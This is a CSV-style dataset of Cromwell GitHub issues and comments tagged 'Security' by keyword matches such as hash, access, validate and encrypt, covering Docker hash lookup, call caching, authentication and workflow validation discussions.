you",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6441:520,access,access,520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6441,1,['access'],['access']
Security,Disable hash lookup when we have the docker digest,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545:8,hash,hash,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545,1,['hash'],['hash']
Security,Discussed name of the file with @katevoss and we're going to go with `SecurityRecommendations.md`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259488332:70,Secur,SecurityRecommendations,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259488332,1,['Secur'],['SecurityRecommendations']
Security,"Discussed with @katevoss - as we don't have our long range documentation plan hashed out yet for now we'll be:; - Making a separate doc (name tbd) with two initial bits. One is the content from @delocalizer describing a user based setup. We'll make it clear that this is their set up and not ours, both from the indemnity angle that @cjllanwarne was concerned about but more importantly because it helps to demonstrate the vibrant community which is building around Cromwell; - I'll add a second section describing Firecloud's security model; - That doc will be linked from the README; - We'll set up a blog post on the main site describing security/auth options in Cromwell and directly referencing this doc. Readers/users will be encouraged to ask questions, provide alternate suggestions, etc. The security doc (for lack of a better word atm) will be more of a living doc. @delocalizer ... I don't want to make extra work for you here. If you wanted to update this PR to reflect the first and third bullet points great, otherwise I can pick up this PR and do first and third while i'm doing the second. If you're going with the former hold off until I confirm the name of the file :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259449531:78,hash,hashed,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259449531,8,"['hash', 'secur']","['hashed', 'security']"
Security,"Discussed with @scottfrazer, I reproduced the bug on the git hash provided by Jose, and same wdl didn't yield duplicate inputs on develop.; I think this can be marked resolved.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197934567:61,hash,hash,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/576#issuecomment-197934567,1,['hash'],['hash']
Security,Do not retry Centaur tests which try to validate `callCaching` keys in metadata - retries will likely be waste of time in this case [BA-6130],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5322:40,validat,validate,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5322,1,['validat'],['validate']
Security,"Doc section on ""security by sysadmin""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653:16,secur,security,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653,1,['secur'],['security']
Security,Docker Hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969:7,Hash,Hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969,1,['Hash'],['Hash']
Security,Docker Hash Lookup v3,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048:7,Hash,Hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048,1,['Hash'],['Hash']
Security,"Docker Hub is incredibly slow when accessed directly from Hangzhou or any other location within China. There is no known Alibaba Cloud provided CDN or cache for docker images on BCS. To significantly speed up docker pulls users are able to upload docker images to their own private docker registry hosted within one of their OSS buckets. This uses a plugin contributed to the docker codebase that stores and retrieves docker images via an OSS client. Currently the BCS backend allows users to specify the private OSS registry within the `docker` runtime attribute. For portability, the `docker` runtime attribute should only specify the image, and a separate `dockerRegistry` runtime attribute should optionally specify a private OSS registry. Ideally there should be a way for a user to cache docker images on their own private OSS registry while still using contributed by others WDLs. One particular issue for call caching may be that the docker image hashes are probably registry specific. Cromwell's call caching code requires WDL to specify a hash that may only be available on docker hub, and may not be available on an OSS mirror, even if the image contains the exact same content. Also it should be decided if the BCS backend should behave like the JES/PAPI backend and only allow jobs that specify a `docker` runtime attribute, or if the behavior should continue to be like the `Local`/`SFS` backends and allow running jobs on the bare VM without a docker container. Links regarding BCS/OSS and docker:; - ([EN translation](https://translate.google.com/translate?hl=en&sl=zh-CN&tl=en&u=https%3A%2F%2Fhelp.aliyun.com%2Fdocument_detail%2F28022.html)) https://help.aliyun.com/document_detail/28022.html; - ([EN translation](https://translate.google.com/translate?hl=en&sl=zh-CN&tl=en&u=https%3A%2F%2Fhelp.aliyun.com%2Fdocument_detail%2F42402.html)) https://help.aliyun.com/document_detail/42402.html; - https://docs.docker.com/registry/storage-drivers/; - https://github.com/docker/distribution",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3518:35,access,accessed,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3518,2,"['access', 'hash']","['accessed', 'hashes']"
Security,Docker authentication for AWS Backend [BT-293],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6359:7,authenticat,authentication,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6359,3,['authenticat'],['authentication']
Security,Docker hash mismatch between 26 and 27,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2359:7,hash,hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2359,1,['hash'],['hash']
Security,Docker hash-lookup when there is no digest of a docker image,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6940:7,hash,hash-lookup,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6940,1,['hash'],['hash-lookup']
Security,Docker hashing gets its own subproject.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2099:7,hash,hashing,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2099,1,['hash'],['hashing']
Security,Docker image hash field too small,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301:13,hash,hash,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301,1,['hash'],['hash']
Security,"Docker requires all image lookups to be qualified by a repository name. For Broad images our repository is ""broadinstitute"", and in our WDLs we request Broad images with the repository explicitly specified a la ""broadinstitute/genomes-in-the-cloud"". The more universal images like ""ubuntu"" don't require an explicit repository specification in casual parlance, but still require a default repository specification of ""library"" for hash lookups. When a Docker image is specified in WDL that includes a hash, Cromwell skips the hash lookup and just hashes the image name. Cromwell 26 would use essentially the Docker image string that had been specified in the WDL, i.e. something like `ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`. Cromwell 27 inadvertently changed the internal representation of the image string to prepend the `library/` repository even when it hadn't been explicitly specified in the WDL. This meant that the Docker string would hash differently on 27 than it did on 26, resulting in unwanted cache misses. These changes look to track whether a repository has been explicitly specified or not, and only prepend the `library/` where required on hash lookups.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081:431,hash,hash,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2360#issuecomment-308687081,6,['hash'],"['hash', 'hashes']"
Security,DockerHub authentication for AWS Backend. Previous PR: https://github.com/broadinstitute/cromwell/pull/6359,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6489:10,authenticat,authentication,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6489,2,['authenticat'],['authentication']
Security,Docs and Error messaging for Pair access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2300:34,access,access,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2300,1,['access'],['access']
Security,"Docs:; - Fixed a bunch of broken links; - I think the Scala Steward updates gave us a new version of doc generation that is more strict; - There are more broken links than just these, did not attempt to be comprehensive; - IntelliJ's markdown validation is helpful:. ![Screen Shot 2020-08-19 at 12 15 43 PM](https://user-images.githubusercontent.com/1087943/90661978-d2613d00-e215-11ea-8c1d-5ae4c842213e.png). Error messages:; - Attempted to make them more concise and consistent; - Sometimes we didn't make it obvious that a limit is configurable; - Did not attempt to be comprehensive",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5779:243,validat,validation,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5779,1,['validat'],['validation']
Security,Document noAddress feature with instructions to set Google Private Access BA-5740,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5045:67,Access,Access,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5045,1,['Access'],['Access']
Security,"Doesn't close #751 but stabs in its general direction. There is no persistent DB here, I replaced the DB-based approach in `KeyValueServiceActor` with a simple `Map` since the DB-based approach always failed to write due to referential integrity constraints that aren't going to be fixed (no `EXECUTION` or `WORKFLOW_EXECUTION` data for FK constraints). Ruchi and/or I will have a follow-on PR to put a DB table behind this. Also fixed ""abort"" to message the KV service instead of metadata service, removed now-unused `EXECUTION_INFO`-related methods, other assorted cleanup.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1197:236,integrity,integrity,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1197,1,['integrity'],['integrity']
Security,Don't compute call caching hashes if call caching is turned off,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/355:27,hash,hashes,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/355,1,['hash'],['hashes']
Security,Don't compute task hash when Call Caching is turned of via Workflow Options Closes #837,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/846:19,hash,hash,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/846,1,['hash'],['hash']
Security,Don't render secure resources unless build script can use them.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4038:13,secur,secure,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4038,1,['secur'],['secure']
Security,"Draft PR TODOs:; - [x] Add some unit tests; - [X] ImportResolver; - [X] GithubAuthVendingSupport; - [x] Find a better way to do the await result; - [x] Remove from standard config and allow the system to work in the absence of a github auth vending service OR allow it to be configured OFF in config and make that the default 🤔 ; - [x] Move the auth vending message and helper classes out of `impl`. To test this - ; - Go to github and create a limited scope personal access token; - Scope to a single repo; - Add readonly access for Content, and no other permissions; - Update the config of a running instance with the raw token under `GithubAuthVending.config.access-token`. NB don't include the `Bearer` before the token in the config file.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7365:468,access,access,468,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365,3,['access'],"['access', 'access-token']"
Security,"During FireCloud testing, one job out of many similar jobs (all others succeeded) failed in the following way:. ```; $ gcloud alpha genomics operations describe EPKmsKy8KxiFwqr275_Y6hwg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU. message: ""15: Gsutil failed: failed to upload logs for \""gs://fc-7ffecbef-0544-4db7-92a0-a3a0d4bafdfe/447d9c70-0173-47f3-8a00-e59a69290dde/echo_strings/3f63e284-cfd2-4a3d-a846-d468258e1aaf/call-echo_files/\""\; : cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log\; \ gs://fc-7ffecbef-0544-4db7-92a0-a3a0d4bafdfe/447d9c70-0173-47f3-8a00-e59a69290dde/echo_strings/3f63e284-cfd2-4a3d-a846-d468258e1aaf/call-echo_files/,\; \ command failed: AccessDeniedException: 403 Caller does not have storage.objects.create\; \ access to bucket fc-7ffecbef-0544-4db7-92a0-a3a0d4bafdfe.\nAccessDeniedException:\; \ 403 Caller does not have storage.objects.create access to bucket fc-7ffecbef-0544-4db7-92a0-a3a0d4bafdfe.\n\; AccessDeniedException: 403 Caller does not have storage.objects.create access\; \ to bucket fc-7ffecbef-0544-4db7-92a0-a3a0d4bafdfe.\nCommandException: 3 files/objects\; \ could not be transferred.\n: ""; ```; I verified the user's permissions by auth-ing as that user and manually copying a file to the bucket successfully. We should probably add this one to the retry list.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2233:689,Access,AccessDeniedException,689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2233,5,"['Access', 'access']","['AccessDeniedException', 'access']"
Security,"During code review for #1836 @cjllanwarne noted that `processSource` in what is currently named `WorkflowStoreActor` and most likely `WorfklowStoreSubmitActor` by the time this is acted upon looked suspicious as we had (we think) intended json validation to not happen until later and a workflow ID would always be handed back to the user. Further, the failed Future doesn't appear to be getting handed back to the API at all (I think), which would lead to a timeout response. Further since the sources are being processed monadically it is possible for a user to have multiple borked files but only the first will be reported (if we were reporting). Check into what's up here - either don't perform this check on submission or ensure that appropriate error messages are handed back",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882:244,validat,validation,244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882,1,['validat'],['validation']
Security,"EAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:40,098 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(e9851ba1)]: Abort received. Aborting 3 EJEAs; `; Cromwell hash: 192ea6025613df967d60e9e975693144035379d7",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:5679,hash,hash,5679,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['hash'],['hash']
Security,"EFS shines only if it's multi-TB, otherwise directly accessing S3 is much faster (and there's no need to first copy the data from S3 to a filesystem when it can be streamed).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-313258027:53,access,accessing,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1542#issuecomment-313258027,1,['access'],['accessing']
Security,"Early access MVP version of the extractor script, to make sure the extractor, digester and comparer can all be singing from the same hymn sheet as soon as possible. Also to course correct as soon as possible if I've gone in completely the wrong direction, I guess. Featuring:; * Extraction and upload of:; * Workflow metadata; * Operations metadata (PAPI v2alpha1). Not yet implemented; coming soon in part 2 (or 3 (or ...)):; * Subworkflows; * Other operations metadata flavors; * Cromwell code dump upload; * Config dump upload. Especially interested in early feedback on:; * Coding styles (if we want to standardize on one for these scripts); * User interface (eg if you try to use it, is it intuitive?); * If I got the directory structure completely wrong. Changes I suspect might happen in subsequent PRs but I'm reluctant to make in this one-script MVP:; * This function could be re-used, can we extract it to a shared location?; * Could we use a data structure to store this type of information between scripts",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5485:6,access,access,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5485,1,['access'],['access']
Security,Ease optional access with scatter-like block,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1852:14,access,access,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1852,1,['access'],['access']
Security,"Edit (by @cjllanwarne) in light of #4806:. Following #4806 we will be able to read Google project metadata to specify a VPC network and subnet. Therefore what will remain for ***this*** ticket is making the same functionality available on a per-workflow basis... eg an ability to supply the same network/subnetwork information via workflow-options?. ---. ### Original issue text:. https://cloud.google.com/vpc/docs/vpc -- for a primer on GCP Subnets. Users should be able to tell Cromwell to launch nodes into a subnet. For environments like Firecloud, we should have some mechanism (like maybe SAM) to make sure the user actually has the right to use a particular subnet. . The main reason to do this is https://cloud.google.com/vpc/docs/using-flow-logs -- we want to be able to monitor traffic in and out of the network for more significant audited environments. So the driver is ultimately ""compliance"". But it's probably a good idea anyhow. After this is done, please work with FC team to make sure they can take advantage of this. I'm not sure who to tag to make sure this cross-team work is done.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4070:843,audit,audited,843,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4070,1,['audit'],['audited']
Security,"Eg spot the difference between the exposed `err` declaration and the anonymous `b_prime.in_file` expression in:; ```wdl; workflow stdout_stderr_passing {; call a; call b {input: in_file=a.out}; File err = a.err; call b as b_prime {input: in_file=err}; output {; b_prime.out; }; }; ```. ![test](https://user-images.githubusercontent.com/13006282/33454657-7eba9d28-d5e7-11e7-9774-a17cbf3c63e8.png). NB: the dashes on the output are accidental, and I believe to-be-removed in an upcoming @mcovarr PR",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2958:35,expose,exposed,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2958,1,['expose'],['exposed']
Security,"Emit ""time since workflow ended"" time metric when accessing metadata [BW-710]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6365:50,access,accessing,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6365,1,['access'],['accessing']
Security,Enable validation memory test once wdl4s PR is merged,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/726:7,validat,validation,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/726,1,['validat'],['validation']
Security,Encrypt / clear workflow options in DB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1638:0,Encrypt,Encrypt,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1638,1,['Encrypt'],['Encrypt']
Security,Encrypting and clearing workflow options for 0.22.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1648:0,Encrypt,Encrypting,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1648,1,['Encrypt'],['Encrypting']
Security,Encrypting and clearing workflow options.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1647:0,Encrypt,Encrypting,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1647,1,['Encrypt'],['Encrypting']
Security,Encrypting and clearing workflow options. Closes #1638,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1650:0,Encrypt,Encrypting,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1650,1,['Encrypt'],['Encrypting']
Security,Encrypting workflow options,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/204:0,Encrypt,Encrypting,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/204,1,['Encrypt'],['Encrypting']
Security,"Endpoint with these arguments:; - `call1_fqn`; - `call1_index`; - `call2_fqn`; - `call2_index`. Which would return a set of call caching hashes which were generated for call2 which do not match call1. Has to be exactly that, to mirror the call caching algorithm",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1990:137,hash,hashes,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1990,1,['hash'],['hashes']
Security,"Exactly why. Since Cromiam fiddles with labels, if a workflow fails to validate that control information is lost",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3228#issuecomment-362119435:71,validat,validate,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3228#issuecomment-362119435,1,['validat'],['validate']
Security,"Example 1 (valid WDL code):; ```; version 1.0. workflow main {; output {; Array[String] x = flatten([[""1""], [""2""]]); }; }; ```; It will validate:; ```; $ java -jar womtool-55.jar validate main.wdl ; Success!; ```; And it will run successfully:; ```; $ java -jar cromwell-55.jar run main.wdl; ...; ""main.x"": [""1"", ""2""]; ...; ```. Example 2 (invalid WDL code):; ```; version 1.0. workflow main {; output {; Array[String] x = flatten([[""1""], [[""2""]]]); }; }; ```; It will validate:; ```; $ java -jar womtool-55.jar validate main.wdl ; Success!; ```; But it will error out:; ```; $ java -jar cromwell-55.jar run main.wdl; ...; Failed to evaluate 'main.x' (reason 1 of 1): Evaluating flatten([[""1""], [[""2""]]]) failed: No coercion defined from wom value(s) '[""2""]' of type 'Array[String]' to 'String'.; ...; ```. Example 3 (invalid WDL code):; ```; version 1.0. workflow main {; output {; Array[String] x = flatten([[[""1""]], [[""2""]]]); }; }; ```; It will not validate:; ```; $ java -jar womtool-55.jar validate main.wdl ; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'Array[String] x = flatten([[[""1""]], [[""2""]]])' (reason 1 of 1): Cannot coerce expression of type 'Array[Array[String]+]+' to 'Array[String]'; ```. It is not a big deal, as the offending construct in Example 2 is not widely used, but it seems like a missed opportunity for flagging as an issue during the validation process. And why is it that womtool can flag Example 3 but not Example 2?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6185:136,validat,validate,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6185,7,['validat'],"['validate', 'validation']"
Security,"Excellent point from @cjllanwarne: we are protected from the ""workshop scenario"" - many users validating the same WF at the same time - by the Rawls cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477:94,validat,validating,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958477,1,['validat'],['validating']
Security,"Excellent. So if I fix that in my conf, the messages should go away,; right? Can I specify docker.hash-lookup.method in the workflow_options?. On Fri, Aug 11, 2017 at 1:31 PM, Thib <notifications@github.com> wrote:. > If the image is not on dockerhub but exists locally to where the Cromwell; > application is running then it should be able to find the hash if docker.hash-lookup.method; > = ""local""; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321872886>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXkxZ61CdCMTLR5po4xUtPAM1MnJ0sks5sXI_2gaJpZM4O0GvF>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321874576:98,hash,hash-lookup,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2538#issuecomment-321874576,3,['hash'],"['hash', 'hash-lookup']"
Security,ExecutionActor.scala:549); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:539); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientReques,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:4094,secur,security,4094,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,1,['secur'],['security']
Security,Expose Meta object or labels in Cromwell Metadata Output,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2421:0,Expose,Expose,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2421,1,['Expose'],['Expose']
Security,Expose an option that can be of some limited use in increasing cache hit throughput.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2027:0,Expose,Expose,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2027,1,['Expose'],['Expose']
Security,Expose new /query fields,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4831:0,Expose,Expose,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4831,1,['Expose'],['Expose']
Security,Expressions in array accesses won't parse,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2599:21,access,accesses,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2599,1,['access'],['accesses']
Security,"FWIW [the documentation](https://gsaweb.broadinstitute.org/wdl/devzone/) says `read_json` will do what I expect! Ctrl+F ""Array deserialization using read_json()"". Here's the WDL task I was trying to validate:. ```; # reverses a json array; task reverseArray {; Array[Int] intArray; ; command {; python -c ""import sys; print(list(map(int, sys.argv[-1:0:-1])))"" ${sep=' ' intArray}; }; ; output {; Array[Int] outArr = read_json(stdout()); }; }; ```. And got the error:. ```$ java -jar wdltool-0.4.jar validate json_things.wdl; ERROR: Could not determine type of declaration outArr:; Array[Int] outArr = read_json(stdout()); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1825#issuecomment-271403754:199,validat,validate,199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1825#issuecomment-271403754,2,['validat'],['validate']
